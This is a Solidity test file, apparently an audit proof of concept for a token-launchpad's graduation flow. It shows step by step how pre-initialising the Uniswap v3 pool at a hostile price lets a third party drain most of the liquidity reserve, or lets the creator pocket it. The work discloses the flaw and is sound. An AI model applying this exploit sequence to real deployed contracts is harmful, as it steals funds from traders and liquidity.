// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {BondingCurve} from "../../src/BondingCurve.sol";
import {GraduationManager} from "../../src/GraduationManager.sol";
import {HoodiumFactory} from "../../src/HoodiumFactory.sol";
import {HoodiumToken} from "../../src/HoodiumToken.sol";
import {LPLocker} from "../../src/LPLocker.sol";
import {FeeVault} from "../../src/FeeVault.sol";
import {MockUSDG} from "../mocks/MockUSDG.sol";
import {MockUniswapFactory, MockUniswapPool} from "../mocks/MockUniswap.sol";
import {INonfungiblePositionManager} from "../../src/interfaces/IUniswapV3.sol";

/**
 * AUDIT PoC — pool pre-priming at graduation.
 *
 * GraduationManager._ensurePool uses an existing pool as-is and only initialises
 * it when slot0 is zero. Creating and initialising a Uniswap v3 pool is
 * permissionless and needs no tokens, and the mint uses amount0Min = amount1Min
 * = 0. So anyone who knows the token address (it is in TokenLaunched) can set
 * the opening price before graduation, and the full-range mint then consumes
 * the reserves at THAT price.
 *
 * The stock MockPositionManager ignores price, so this file carries a
 * price-aware stand-in that models a full-range v3 position the way Uniswap
 * does: liquidity L = min(amount0 * sqrtP, amount1 / sqrtP), used0 = L / sqrtP,
 * used1 = L * sqrtP, and swaps against it as constant product (which is exactly
 * what a single full-range position is).
 */
contract PriceAwarePositionManager is ERC721 {
    using SafeERC20 for IERC20;

    uint256 constant Q96 = 1 << 96;

    MockUniswapFactory public immutable uniFactory;

    struct Position {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint128 liquidity;
        uint256 reserve0;
        uint256 reserve1;
    }

    mapping(uint256 => Position) public positionOf;
    uint256 public nextId = 1;

    constructor(MockUniswapFactory f) ERC721("Price PM", "PPM") {
        uniFactory = f;
    }

    function mint(INonfungiblePositionManager.MintParams calldata p)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1)
    {
        address pool = uniFactory.getPool(p.token0, p.token1, p.fee);
        uint256 sqrtP = MockUniswapPool(pool).sqrtPriceX96();
        require(sqrtP > 0, "not initialised");

        uint256 l0 = Math.mulDiv(p.amount0Desired, sqrtP, Q96);
        uint256 l1 = Math.mulDiv(p.amount1Desired, Q96, sqrtP);
        uint256 L = l0 < l1 ? l0 : l1;
        amount0 = Math.mulDiv(L, Q96, sqrtP);
        amount1 = Math.mulDiv(L, sqrtP, Q96);
        require(amount0 >= p.amount0Min && amount1 >= p.amount1Min, "slippage");

        IERC20(p.token0).safeTransferFrom(msg.sender, address(this), amount0);
        IERC20(p.token1).safeTransferFrom(msg.sender, address(this), amount1);

        tokenId = nextId++;
        liquidity = uint128(L);
        positionOf[tokenId] =
            Position(p.token0, p.token1, p.fee, p.tickLower, p.tickUpper, liquidity, amount0, amount1);
        _mint(p.recipient, tokenId);
    }

    /// Sell `amountIn` of token0 or token1 into the position (constant product, no fee).
    function swap(uint256 tokenId, address tokenIn, uint256 amountIn) external returns (uint256 amountOut) {
        Position storage pos = positionOf[tokenId];
        bool zeroForOne = tokenIn == pos.token0;
        (uint256 rIn, uint256 rOut) = zeroForOne ? (pos.reserve0, pos.reserve1) : (pos.reserve1, pos.reserve0);
        address tokenOut = zeroForOne ? pos.token1 : pos.token0;

        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);
        amountOut = rOut - Math.mulDiv(rIn, rOut, rIn + amountIn, Math.Rounding.Ceil);
        if (zeroForOne) {
            pos.reserve0 += amountIn;
            pos.reserve1 -= amountOut;
        } else {
            pos.reserve1 += amountIn;
            pos.reserve0 -= amountOut;
        }
        IERC20(tokenOut).safeTransfer(msg.sender, amountOut);
    }

    function collect(INonfungiblePositionManager.CollectParams calldata) external payable returns (uint256, uint256) {
        return (0, 0);
    }

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        )
    {
        Position storage p = positionOf[tokenId];
        token0 = p.token0;
        token1 = p.token1;
        fee = p.fee;
        tickLower = p.tickLower;
        tickUpper = p.tickUpper;
        liquidity = p.liquidity;
        return (
            nonce,
            operator,
            token0,
            token1,
            fee,
            tickLower,
            tickUpper,
            liquidity,
            feeGrowthInside0LastX128,
            feeGrowthInside1LastX128,
            tokensOwed0,
            tokensOwed1
        );
    }
}

contract PoolPrePrimingTest is Test {
    uint256 constant USDG_UNIT = 1e6;
    uint256 constant TOKEN_UNIT = 1e18;
    uint256 constant TOTAL_SUPPLY = 1_000_000_000 * TOKEN_UNIT;
    uint256 constant CURVE_ALLOCATION = 800_000_000 * TOKEN_UNIT;
    uint256 constant GRADUATION_TARGET = 69_000 * USDG_UNIT;
    uint256 constant Q96 = 1 << 96;

    MockUSDG usdg;
    FeeVault vault;
    MockUniswapFactory uniFactory;
    PriceAwarePositionManager pm;
    LPLocker locker;
    GraduationManager manager;
    HoodiumFactory factory;
    HoodiumToken token;
    BondingCurve curve;

    address creator = makeAddr("creator");
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");

    function setUp() public {
        usdg = new MockUSDG();
        address[] memory owners = new address[](2);
        owners[0] = makeAddr("s1");
        owners[1] = makeAddr("s2");
        vault = new FeeVault(owners, 2);

        uniFactory = new MockUniswapFactory();
        pm = new PriceAwarePositionManager(uniFactory);
        locker = new LPLocker(address(pm), address(vault), 3_000);
        manager = new GraduationManager(address(uniFactory), address(pm), address(locker), address(usdg), 10_000, 200);

        factory = new HoodiumFactory(
            HoodiumFactory.FactoryConfig({
                usdg: address(usdg),
                feeVault: address(vault),
                graduationManager: address(manager),
                tokenDecimals: 18,
                totalSupply: TOTAL_SUPPLY,
                curveAllocation: CURVE_ALLOCATION,
                virtualUsdg: 12_000 * USDG_UNIT,
                graduationTarget: GRADUATION_TARGET,
                graduationFee: 0,
                tradeFeeBps: 100,
                creatorFeeShareBps: 7_000,
                creationFee: 0,
                devBuyMaxBps: 500,
                snipeBlocks: 3,
                snipeMaxBps: 100
            })
        );

        vm.prank(creator);
        (address t, address c) = factory.launch("Grad", "GRAD", "ipfs://x", 0, 0);
        token = HoodiumToken(t);
        curve = BondingCurve(c);
        vm.roll(block.number + 4);
    }

    function _buy(address who, uint256 amount) internal {
        usdg.mint(who, amount);
        vm.startPrank(who);
        usdg.approve(address(curve), amount);
        curve.buy(amount, 0);
        vm.stopPrank();
    }

    /// Same formula as GraduationManager._sqrtPriceX96, for the fair price.
    function _fairSqrtP(uint256 amount0, uint256 amount1) internal pure returns (uint256) {
        return Math.sqrt(Math.mulDiv(amount1, Q96, amount0)) << 48;
    }

    function _lpAmounts() internal view returns (uint256 usdgForLp, uint256 tokensForLp) {
        usdgForLp = curve.reserveUsdg() - curve.graduationFee();
        tokensForLp = curve.lpAllocation() + curve.curveAllocation() - curve.tokensSold();
    }

    /// Create + initialise the pool before graduation, exactly as anyone can on
    /// the real UniswapV3Factory / UniswapV3Pool (no tokens needed).
    /// `tokenExpensive` = true makes TOKEN 1e6x dearer than fair; false, 1e6x cheaper.
    function _primePool(address who, bool tokenExpensive) internal {
        (uint256 usdgForLp, uint256 tokensForLp) = _lpAmounts();
        bool tokenIs0 = address(token) < address(usdg);
        (address t0, address t1) = tokenIs0 ? (address(token), address(usdg)) : (address(usdg), address(token));
        uint256 fair = tokenIs0 ? _fairSqrtP(tokensForLp, usdgForLp) : _fairSqrtP(usdgForLp, tokensForLp);
        // price = token1/token0; TOKEN dear means high price if TOKEN is token0, low if token1.
        bool up = tokenIs0 == tokenExpensive;
        uint256 hostile = up ? fair * 1000 : fair / 1000;

        vm.startPrank(who);
        address pool = uniFactory.createPool(t0, t1, 10_000);
        MockUniswapPool(pool).initialize(uint160(hostile));
        vm.stopPrank();
    }

    /// Control: with a fresh pool the manager sets the fair price and both sides land in the pool.
    function test_audit_control_freshPoolUsesBothSides() public {
        _buy(alice, 200_000 * USDG_UNIT);
        (uint256 usdgForLp, uint256 tokensForLp) = _lpAmounts();

        curve.graduate();

        // Not exact: _sqrtPriceX96 drops ~48 bits, so a few micro-USDG round off as dust.
        assertGt(usdg.balanceOf(address(pm)), usdgForLp * 9999 / 10000, "~all usdg in pool");
        assertGt(token.balanceOf(address(pm)), tokensForLp * 9999 / 10000, "~all tokens in pool");
        assertLt(usdg.balanceOf(creator), usdgForLp / 10000, "creator only got rounding dust");
    }

    /**
     * Attack: a third party (not the creator) buys a little on the curve, then
     * initialises the pool at 1,000,000x the fair token price. Graduation puts
     * ~all USDG and ~0.1% of the tokens into the pool; 99.9% of the LP token
     * allocation is "dust" sent to the creator; the attacker then sells the
     * tokens they bought on the curve into the mispriced pool and takes most of
     * the reserve.
     */
    function test_audit_prePrimedPool_thirdPartyDrainsReserve() public {
        // Attacker gets in early and cheap; everyone else fills the curve.
        _buy(attacker, 2_000 * USDG_UNIT);
        _buy(alice, 200_000 * USDG_UNIT);
        assertTrue(curve.curveComplete());
        (uint256 usdgForLp, uint256 tokensForLp) = _lpAmounts();

        _primePool(attacker, true);

        // Graduation is permissionless; the attacker triggers it.
        vm.prank(attacker);
        (, uint256 tokenId) = curve.graduate();

        _assertPoolSkewed(usdgForLp, tokensForLp);
        _dumpAndAssert(tokenId, usdgForLp);
    }

    function _assertPoolSkewed(uint256 usdgForLp, uint256 tokensForLp) internal {
        uint256 poolUsdg = usdg.balanceOf(address(pm));
        uint256 poolTokens = token.balanceOf(address(pm));
        emit log_named_uint("usdg meant for pool     ", usdgForLp);
        emit log_named_uint("usdg in pool            ", poolUsdg);
        emit log_named_uint("tokens meant for pool   ", tokensForLp);
        emit log_named_uint("tokens in pool          ", poolTokens);
        emit log_named_uint("tokens dust -> creator  ", token.balanceOf(creator));

        assertGt(poolUsdg, usdgForLp * 99 / 100, "pool took ~all the USDG");
        assertLt(poolTokens, tokensForLp / 500, "pool took a sliver of the tokens");
        assertGt(token.balanceOf(creator), tokensForLp * 99 / 100, "LP allocation handed to creator as dust");
    }

    function _dumpAndAssert(uint256 tokenId, uint256 usdgForLp) internal {
        uint256 attackerTokens = token.balanceOf(attacker);
        uint256 usdgBefore = usdg.balanceOf(attacker);
        vm.startPrank(attacker);
        token.approve(address(pm), attackerTokens);
        uint256 out = pm.swap(tokenId, address(token), attackerTokens);
        vm.stopPrank();
        emit log_named_uint("attacker paid on curve  ", 2_000 * USDG_UNIT);
        emit log_named_uint("attacker took from pool ", out);

        assertEq(usdg.balanceOf(attacker) - usdgBefore, out);
        assertGt(out, usdgForLp / 2, "attacker extracted more than half of the graduation reserve");
        assertGt(out, 2_000 * USDG_UNIT * 10, "attacker's profit is >10x their outlay");
    }

    /**
     * Variant: the pool is pre-priced the other way (token extremely cheap).
     * Then the position consumes the tokens and almost none of the USDG, and the
     * USDG "dust" is sent to the creator — a creator-side rug: the creator
     * receives the reserve that was meant to become locked liquidity.
     */
    function test_audit_prePrimedPool_creatorReceivesReserveAsDust() public {
        _buy(alice, 200_000 * USDG_UNIT);
        (uint256 usdgForLp,) = _lpAmounts();

        _primePool(creator, false);
        vm.prank(creator);
        curve.graduate();

        emit log_named_uint("usdg meant for pool ", usdgForLp);
        emit log_named_uint("usdg to creator     ", usdg.balanceOf(creator));
        assertGt(usdg.balanceOf(creator), usdgForLp * 99 / 100, "creator pocketed the reserve as dust");
        assertLt(usdg.balanceOf(address(pm)), usdgForLp / 500, "pool is nearly unfunded");
    }
}
